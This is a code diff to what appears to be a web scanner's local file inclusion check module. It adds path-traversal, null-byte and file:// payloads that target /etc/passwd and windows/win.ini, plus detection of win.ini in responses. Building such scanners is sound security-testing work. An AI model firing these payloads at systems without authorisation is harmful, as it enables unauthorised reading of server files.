@@ -50,8 +50,13 @@ public class LFIAbsoluteModule implements IModule{
     private static final List<byte[]> LFI_INJECTION_TESTS = Arrays.asList(
             ".../....///.../....///.../....///.../....///.../....///.../....///etc/passwd".getBytes(),
             ".../...//.../...//.../...//.../...//.../...//.../...//.../...//.../...//etc/passwd".getBytes(),
+            "../../../../../../../../../../../../../../../../etc/passwd%00.html".getBytes(),
+            "file:///c:/windows/win.ini".getBytes(),
             "file:///etc/passwd".getBytes(),
-            "%2fetc%2fpasswd".getBytes()
+            "file://\\/\\/etc/passwd".getBytes(),
+            "%2fetc%2fpasswd".getBytes(),
+            "../../../../../../../../../../../../../../../../windows/win.ini".getBytes(),
+            "../../../../../../../../../../../../../../../../windows/win.ini%00.html".getBytes()
     );    
     
     
@@ -75,7 +80,8 @@ public class LFIAbsoluteModule implements IModule{
                 // look for matches of our active check grep string
                 byte[] response =  checkRequestResponse.getResponse();
                 
-                if (HTTPMatcher.isEtcPasswdFile(response, helpers)) {
+                if (HTTPMatcher.isEtcPasswdFile(response, helpers) ||
+                    HTTPMatcher.isWinIni(response, helpers)) {
 
                     issues.add(new CustomScanIssue(
                             baseRequestResponse.getHttpService(),
